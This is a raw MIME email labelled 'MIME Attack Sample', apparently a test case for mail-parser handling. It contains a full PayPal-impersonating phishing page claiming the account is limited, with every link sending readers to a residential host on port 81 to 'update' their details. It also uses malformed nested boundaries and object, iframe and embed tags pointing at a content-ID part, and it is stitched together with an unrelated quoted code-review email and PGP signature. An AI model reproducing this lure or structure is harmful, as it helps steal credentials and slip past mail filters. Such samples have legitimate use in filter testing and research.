From: matt.lorenz@enron.com
To: carol.brittain@enron.com
Subject: MIME Attack Sample
Content-Type: multipart/related; boundary="DELIMITER"
--DELIMITER
Content-Type: text/html
Content-Type: text/html;
Content-Transfer-Encoding: quoted-printable

<body>
<style>
BODY, TD
{font-family:verdana,arial,helvetica,sans-serif;font-size:12px;color:#0000=
00;}
LI
{line-height:120%;}
UL.smallBorder
{;}
LI.smallBorderLi
{;}
UL.Narrow
{;}
HR.dotted
{width:100%;border-left:#fff;border-right:#fff;border-top:#fff;border-bott=
om:2px
dotted #ccc;}
smallEmphasis
{font-family:verdana,arial,helvetica,sans-serif;font-size:10px;font-weight=
:bold;color:#000000;}
serifBig
{font-family:serif;font-size:20px;font-weight:bold;color:#000000;}
serif
{font-family:serif;font-size:16px;color:#000000;}
sansSerif
{font-family:verdana,arial,helvetica,sans-serif;font-size:16px;color:#0000=
00;}
heading
{font-family:verdana,arial,helvetica,sans-serif;font-size:18px;font-weight=
:bold;color:#003366;}
subHeadingEoa
{font-family:verdana,arial,helvetica,sans-serif;font-size:15px;font-weight=
:bold;color:#000000;}
subHeading
{font-family:verdana,arial,helvetica,sans-serif;font-size:16px;font-weight=
:bold;color:#003366;}
sidebarText
{font-family:verdana,arial,helvetica,sans-serif;font-size:11px;color:#0033=
66;}
sidebarTextBold
{font-family:verdana,arial,helvetica,sans-serif;font-size:11px;font-weight=
:bold;color:#003366;}
xptFooter
{font-family:verdana,arial,helvetica,sans-serif;font-size:11px;color:#aaaa=
aa;}
button
{font-size:13px;font-family:verdana,arial,helvetica,sans-serif;font-weight=
:400;border-style:outset;color:#000000;background-color:#cccccc;}
smaller
{font-family:verdana,arial,helvetica,sans-serif;font-size:10px;color:#0000=
00;}
smallerSidebar
{font-family:verdana,arial,helvetica,sans-serif;font-size:10px;color:#0033=
66;}
emphasis
{font-weight:700;}
table#invoice, table#invoice_controls,
table#invoice_note
{width:600px;}
table#invoice_note
{;}
table#invoice_controls
{text-align:right;}
table#invoice
{border-collapse:collapse;border:1px solid #aaa;}
table#invoice td
{font-size:11px;border:1px solid #ccc;padding:2px;}
table#invoice td.field_label_right, table#invoice
td.field_label_right_error
{font-weight:bold;text-align:right;}
table#invoice td.field_label_right_error,
table#invoice td.field_label_error
table#invoice tr.title td
{font-weight:bold;line-height:20px;text-align:left;background-color:#ccdde=
e;}
table#invoice input.readonly
{border:0;text-align:right;}
table#invoice input.readonly_currency
{border:0;width:10px;}
field_error, .field_error input.readonly_currency
{background-color:#FF3333;}
currency_highlight
{background-color:#ffffcc;}
tax
{font-weight:400;float:left;}
table#invoice td span.curr
{float:left;}
table#invoice td.currency
{border-right:1px solid #fff;}
table#invoice td.calc
{font-weight:bold;text-align:right;}
inlineBlue
{color:#00f;}
small
{font-size:11px;font-weight:400;}
HR.solid
{width:100%;border-left:#fff;border-right:#fff;border-top:#fff;border-bott=
om:2px
solid #999;}
large
{font-size:17px;}
smallVerdanaGrey
{font-family:verdana;font-size:10px;color:#999999;}
smallVerdana
{font-family:verdana;font-size:10px;color:#000000;}
smallArial
{font-family:arial;font-size:13px;}
smallArialBlue
{font-family:verdana;font-size:9px;color:#0000FF;}
smallVerdanaGreen
{font-family:verdana;font-size:10px;color:#666666;}
smaller
{font-size:10px;color:gray;}
larger
{font-size:18px;font-family:arial;font-weight:600;}
longTableValue
{word-break:break-all;}
longSideBarText
{width:190px;word-break:break-all;}
</style>
<div>
<table align=3Dcenter border=3D0 cellpadding=3D0
cellspacing=3D0 width=3D600><tr valign=3Dtop><td><a
href=3D"http://wsip-24-249-200-205.sd.sd.cox.net:81/update/"><img
src=3D"http://images.paypal.com/en_US/i/logo/email_logo.gif"
border=3D0 alt=3DPayPal></a></td></tr></table><table
align=3Dcenter border=3D0 cellpadding=3D0 cellspacing=3D0
width=3D"100%"><tr><td
background=3D"http://images.paypal.com/en_US/i/scr/bg_clk.gif"
width=3D"100%"><img alt=3D"" border=3D0 height=3D29
src=3D"http://images.paypal.com/en_US/i/scr/pixel.gif"
width=3D1></td></tr><tr><td><img alt=3D"" border=3D0
height=3D10
src=3D"http://images.paypal.com/en_US/i/scr/pixel.gif"
width=3D1></td></tr></table><table align=3Dcenter border=3D0
cellpadding=3D0 cellspacing=3D0
width=3D600><tr><td></tr></table><table align=3Dcenter
border=3D0 cellpadding=3D0 cellspacing=3D0 width=3D600><tr
valign=3Dtop><td width=3D"100%"><table align=3Dright
bgcolor=3D"#cccccc" border=3D0 cellpadding=3D1 cellspacing=3D0
width=3D190><tr><td><table align=3Dcenter
bgcolor=3D"#ffffff" border=3D0 cellpadding=3D0 cellspacing=3D0
width=3D"100%"><tr><td><table align=3Dcenter
bgcolor=3D"#eeeeee" border=3D0 cellpadding=3D5 cellspacing=3D0
width=3D"100%"><tr><td align=3Dcenter><span
class=3DsideBarTextBold>Protect Your Account
Info</span></td></tr></table><table align=3Dcenter
border=3D0 cellpadding=3D5 cellspacing=3D0
width=3D"100%"><tr><td class=3DsideBarText
bgcolor=3D"#ffffff">Make sure you never provide your
password to fraudulent websites.<br><br>
PayPal will never ask you to enter your password in an
email.<br>
<br>For more information on protecting yourself from
fraud, please review our Security Tips  at  <span
class=3DlongSideBarText>https://www.paypal.com/us/securitytips</span><br><=
img
alt=3D"" border=3D0 height=3D5
src=3D"http://images.paypal.com/en_US/i/scr/pixel.gif"
width=3D1></td></tr></table></td></tr></table><table
align=3Dcenter bgcolor=3D"#ffffff" border=3D0 cellpadding=3D0
cellspacing=3D0 width=3D"100%"><tr><td><table align=3Dcenter
bgcolor=3D"#eeeeee" border=3D0 cellpadding=3D5 cellspacing=3D0
width=3D"100%"><tr><td align=3Dcenter
class=3DsideBarTextBold>Protect Your
Password</td></tr></table><table align=3Dcenter border=3D0
cellpadding=3D5 cellspacing=3D0 width=3D"100%"><tr><td
class=3DsideBarText>You should <span
class=3Demphasis>never</span> give your PayPal password
to anyone, including PayPal employees.<br><img alt=3D""
border=3D0 height=3D5
src=3D"http://images.paypal.com/en_US/i/scr/pixel.gif"
width=3D1></td></tr></table></td></tr></table></td></tr><tr><td></tr></tab=
le>

<span class=3Dheading>PayPal Account Limited <br>
</span>
<p><strong> Dear PayPal Member,</strong>
<p><p><font size=3D"2" face=3D"Verdana, Arial, Helvetica, sans-serif"><str=
ong>Paypal</strong> is constantly working to ensure security by regulary s=
creening the accounts in our system.We recently reviewed your account,and =
we need more information to help us provide you with secure service.Until =
we can collect this information,your access to sensitive account features =
will be limited.We would like to restore your acces as soon as possible,an=
d we apologize for the inconvenience.<br><br>
  <strong>Why is my account access limited?</strong><br><br>
  Your account access has been limited for the following reason(s):<br><br=
>
		     
		      <font size=3D"2" face=3D"Verdana, Arial, Helvetica, sans-serif">
							We would like to ensure that your account was not accessed by an un=
authorized third party.Becouse protecting the security of your account is =
our primary concern,we have limited access to sensitive Paypal account fea=
tures.We understanding that this may be an inconvenience but please unders=
tand that this temporary limitation is for your protection.Case ID Number:=
PP-072-838-482<br><br>
		     
		      <font size=3D"2" face=3D"Verdana, Arial, Helvetica, sans-serif">
							
</p>
You must click the link below and enter your information to review your ac=
count:

<strong></font> <p align=3Dleft><font face=3D"Verdana, Arial, Helvetica, s=
ans-serif" <font <font color=3D"black"><a 
href=3D"http://wsip-24-249-200-205.sd.sd.cox.net:81/update/">Click here to=
 visit the Resolution Center and<br>
complete the Steps to Remove Limitations </a></font></p>
</strong>
<p>Sincerely,<br>
  The PayPal Team</p>
<hr class=3Ddotted>



<span class=3DxptFooter>Please do not reply to this
email. This mailbox is not monitored and you will not
receive a response. For assistance, <a
href=3D"http://wsip-24-249-200-205.sd.sd.cox.net:81/update/">log
in </a> to your PayPal account and choose the Help
link located in the top right corner of any PayPal
page. <br>

  <br>
PayPal Email ID<strong> PP295</strong></span></td>
</tr>
</table>
</div>

</body>


----844855709143496900--
<object width="100%" height="25" data="cid:target"></object>
<iframe width="100%" height="25"  src="cid:target"></iframe>
<embed  width="100%" height="25" src="cid:target"/></embed><img    width="100"  height="25"  src="cid:target">
--DELIMITER
Content-ID: <target>Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature"
--BOUNDARY
Content-Type: text/plain
Content-Transfer-Encoding: quoted-printable
h: SHA1
> 
> Otherwise clients joining the room won't be able to convert other clients'
> channel-specific handles into global handles in order to make Buddy objects,
> because they're not the moderator of the room.
> - ---
>  services/presence/server_plugin.py |   47 ++++++++++++++++++++++++++++++-----
>  1 files changed, 40 insertions(+), 7 deletions(-)

Looks good

> diff --git a/services/presence/server_plugin.py b/services/presence/server_plugin.py
> index 6b21888..18b4776 100644
> - --- a/services/presence/server_plugin.py
> +++ b/services/presence/server_plugin.py
> @@ -30,12 +30,14 @@ import psutils
>  from telepathy.client import ConnectionManager, ManagerRegistry, Connection, Channel
>  from telepathy.interfaces import (
>      CONN_MGR_INTERFACE, CONN_INTERFACE, CHANNEL_TYPE_CONTACT_LIST, CHANNEL_INTERFACE_GROUP, CONN_INTERFACE_ALIASING,
> - -    CONN_INTERFACE_AVATARS, CONN_INTERFACE_PRESENCE, CHANNEL_TYPE_TEXT, CHANNEL_TYPE_STREAMED_MEDIA)
> +    CONN_INTERFACE_AVATARS, CONN_INTERFACE_PRESENCE, CHANNEL_TYPE_TEXT, CHANNEL_TYPE_STREAMED_MEDIA,
> +    PROPERTIES_INTERFACE)
>  from telepathy.constants import (
>      CONNECTION_HANDLE_TYPE_NONE, CONNECTION_HANDLE_TYPE_CONTACT,
>      CONNECTION_STATUS_CONNECTED, CONNECTION_STATUS_DISCONNECTED, CONNECTION_STATUS_CONNECTING,
>      CONNECTION_HANDLE_TYPE_LIST, CONNECTION_HANDLE_TYPE_CONTACT, CONNECTION_HANDLE_TYPE_ROOM,
> - -    CONNECTION_STATUS_REASON_AUTHENTICATION_FAILED)
> +    CONNECTION_STATUS_REASON_AUTHENTICATION_FAILED,
> +    PROPERTY_FLAG_WRITE)
>  
>  CONN_INTERFACE_BUDDY_INFO = 'org.laptop.Telepathy.BuddyInfo'
>  CONN_INTERFACE_ACTIVITY_PROPERTIES = 'org.laptop.Telepathy.ActivityProperties'
> @@ -422,12 +424,43 @@ class ServerPlugin(gobject.GObject):
>                  reply_handler=self._set_self_avatar_cb,
>                  error_handler=lambda *args: self._log_error_cb("setting avatar", *args))
>  
> - -    def _join_activity_create_channel_cb(self, activity_id, signal, handle, userdata, chan_path):
> - -        channel = Channel(self._conn._dbus_object._named_service, chan_path)
> +    def _join_activity_channel_props_set_cb(self, activity_id, signal, handle, channel, userdata):
>          self._joined_activities.append((activity_id, handle))
>          self._set_self_activities()
>          self.emit(signal, activity_id, channel, None, userdata)
>  
> +    def _join_activity_channel_props_listed_cb(self, activity_id, signal, handle, channel, userdata, props, prop_specs):
> +
> +        props_to_set = []
> +        for ident, name, sig, flags in prop_specs:
> +            value = props.pop(name, None)
> +            if value is not None:
> +                if flags & PROPERTY_FLAG_WRITE:
> +                    props_to_set.append((ident, value))
> +                # FIXME: else error, but only if we're creating the room?
> +        # FIXME: if props is nonempty, then we want to set props that aren't
> +        # supported here - raise an error?
> +
> +        if props_to_set:
> +            channel[PROPERTIES_INTERFACE].SetProperties(props_to_set,
> +                reply_handler=lambda: self._join_activity_channel_props_set_cb(activity_id, signal, handle, channel, userdata),
> +                error_handler=lambda e: self._join_error_cb(activity_id, signal, userdata, 'SetProperties(%r)' % props_to_set, e))
> +        else:
> +            self._join_activity_channel_props_set_cb(activity_id, signal, handle, channel, userdata)
> +
> +    def _join_activity_create_channel_cb(self, activity_id, signal, handle, userdata, chan_path):
> +        channel = Channel(self._conn._dbus_object._named_service, chan_path)
> +        props = {
> +            'anonymous': False,         # otherwise buddy resolution breaks
> +            'invite-only': False,       # XXX: should be True in future
> +            #'name': ...                # XXX: set from activity name?
> +            'persistent': False,        # vanish when there are no members
> +            'private': False,           # XXX: should be True unless public
> +        }
> +        channel[PROPERTIES_INTERFACE].ListProperties(
> +            reply_handler=lambda prop_specs: self._join_activity_channel_props_listed_cb(activity_id, signal, handle, channel, userdata, props, prop_specs),
> +            error_handler=lambda e: self._join_error_cb(activity_id, signal, userdata, 'ListProperties', e))
> +
>      def _join_activity_get_channel_cb(self, activity_id, signal, userdata, handles):
>          if not self._activities.has_key(activity_id):
>              self._activities[activity_id] = handles[0]
> @@ -441,10 +474,10 @@ class ServerPlugin(gobject.GObject):
>          self._conn[CONN_INTERFACE].RequestChannel(CHANNEL_TYPE_TEXT,
>              CONNECTION_HANDLE_TYPE_ROOM, handles[0], True,
>              reply_handler=lambda *args: self._join_activity_create_channel_cb(activity_id, signal, handles[0], userdata, *args),
> - -            error_handler=lambda *args: self._join_error_cb(activity_id, signal, userdata, *args))
> +            error_handler=lambda e: self._join_error_cb(activity_id, signal, userdata, 'RequestChannel(TEXT, ROOM, %r, True)' % handles[0], e))
>  
> - -    def _join_error_cb(self, activity_id, signal, userdata, err):
> - -        e = Exception("Error joining/sharing activity %s: %s" % (activity_id, err))
> +    def _join_error_cb(self, activity_id, signal, userdata, where, err):
> +        e = Exception("Error joining/sharing activity %s: (%s): %s" % (activity_id, err))
>          _logger.debug(str(e))
>          self.emit(signal, activity_id, None, e, userdata)
>  
> - -- 
> 1.5.2-rc3.GIT
> 
> -BOUNDARY--
Content-Type: application/pgp-signature; name="signature.asc"
BEGIN PGP SIGNATURE-----
> Version: GnuPG v1.4.6 (GNU/Linux)
> Comment: OpenPGP key: http://www.pseudorandom.co.uk/2003/contact/ or pgp.net
> 
> iD8DBQFGUxElWSc8zVUw7HYRApw4AJwO+/ndtybiTFPQEI35meJuyPzN5wCfUQWo
> EafNRdOl/ITBL5VY7N34abk=
> =piEB
> -----END PGP SIGNATURE-----
> ___
--BOUNDARY--
--DELIMITER--
